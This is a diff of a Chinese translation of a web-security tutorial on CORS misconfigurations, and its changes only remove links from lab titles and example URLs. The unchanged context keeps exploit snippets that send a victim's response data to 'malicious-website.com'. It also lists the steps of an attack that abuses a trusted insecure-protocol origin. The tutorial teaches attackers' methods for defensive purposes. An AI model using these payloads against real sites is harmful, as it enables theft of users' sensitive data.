@@ -58,7 +58,7 @@ location='//malicious-website.com/log?key='+this.responseText;
 };
 ```
 
-**实验室**[具有基本原点反映的CORS漏洞](http://portswigger.cn/academy/subpage/allTopics/all-2.html)
+**实验室**具有基本原点反映的CORS漏洞
 
 ### 解析Origin标头时出错
 
@@ -146,7 +146,7 @@ location='malicious-website.com/log?key='+this.responseText;
 </script>"></iframe>
 ```
 
-**实验室**[具有可信任的空来源的CORS漏洞](http://portswigger.cn/academy/subpage/allTopics/all-2.html#vulnerabilities-arising-from-cors-configuration-issues)
+**实验室**具有可信任的空来源的CORS漏洞
 
 ### 通过CORS信任关系利用XSS
 
@@ -197,17 +197,17 @@ Access-Control-Allow-Credentials: true
 在这种情况下，能够拦截受害者用户流量的攻击者可以利用CORS配置破坏受害者与应用程序的交互。 该攻击包括以下步骤：
 
 * 受害者用户发出任何简单的HTTP请求
-* 攻击者将重定向注入到：[http://trusted-subdomain.vulnerable-website.com](http://trusted-subdomain.vulnerable-website.com)
+* 攻击者将重定向注入到：http://trusted-subdomain.vulnerable-website.com
 * 受害者的浏览器遵循重定向
-* 攻击者拦截原始的HTTP请求，然后将包含CORS请求的欺骗响应返回给：[https://vulnerable-website.com](https://vulnerable-website.com)
+* 攻击者拦截原始的HTTP请求，然后将包含CORS请求的欺骗响应返回给：https://vulnerable-website.com
 * 受害者的浏览器发出CORS请求，包括来源：
-* [http://trusted-subdomain.vulnerable-website.com](http://trusted-subdomain.vulnerable-website.com)
+* http://trusted-subdomain.vulnerable-website.com
 * 该应用程序允许该请求，因为这是白名单来源。 请求的敏感数据将在响应中返回
 * 攻击者的欺骗页面可以读取敏感数据，并将其传输到攻击者控制下的任何域
 
 即使易受攻击的网站对HTTPS的使用比较鲁莽，没有HTTP终结点并且所有cookie被标记为安全，此攻击也有效。
 
-[实验室](http://portswigger.cn/web-security/cross-site-scripting/exploiting)[具有受信任的不安全协议的CORS漏洞](http://portswigger.cn/academy/subpage/allTopics/all-2.html#vulnerabilities-arising-from-cors-configuration-issues)
+实验室具有受信任的不安全协议的CORS漏洞
 
 ### 没有凭证的内联网和CORS
 
@@ -234,7 +234,7 @@ Access-Control-Allow-Origin: *
 
 应用程序服务器信任来自任何来源的资源请求而没有凭据。 如果私有IP地址空间内的用户访问公共Internet，则可以从外部站点执行基于CORS的攻击，该站点使用受害者的浏览器作为访问Intranet资源的代理。
 
-**LAB**[内部网络枢纽攻击的CORS漏洞](http://portswigger.cn/web-security/cors/lab-internal-network-pivot-attack)
+**LAB**内部网络枢纽攻击的CORS漏洞
 
 ## 如何预防基于CORS的攻击
 
